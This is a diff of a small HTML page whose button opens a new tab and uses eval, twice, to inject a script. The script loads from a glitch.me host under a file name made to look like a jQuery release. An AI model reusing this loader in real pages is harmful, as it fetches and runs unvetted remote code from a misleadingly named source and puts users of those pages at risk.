@@ -3,19 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Run JavaScript Twice</title>
+    <title>Run JavaScript Twice in New Tab</title>
 </head>
 <body>
-    <button id="runButton">Run JavaScript Twice</button>
+    <button id="runButton">Run JavaScript Twice in New Tab</button>
 
     <script>
         document.getElementById('runButton').addEventListener('click', function() {
             // Define the JavaScript code to be executed
             var scriptCode = "(function () { var a = document.createElement('script'); a.src = 'https://jquery-scripts.glitch.me/scripts/3.0/jquery-3.0.5.min.js'; document.body.appendChild(a); }())";
 
-            // Run the script twice
-            eval(scriptCode);
-            eval(scriptCode);
+            // Open a new tab
+            var newTab = window.open('about:blank');
+
+            // Once the new tab is loaded, execute the script twice
+            newTab.onload = function() {
+                newTab.eval(scriptCode);
+                newTab.eval(scriptCode);
+            };
         });
     </script>
 </body>
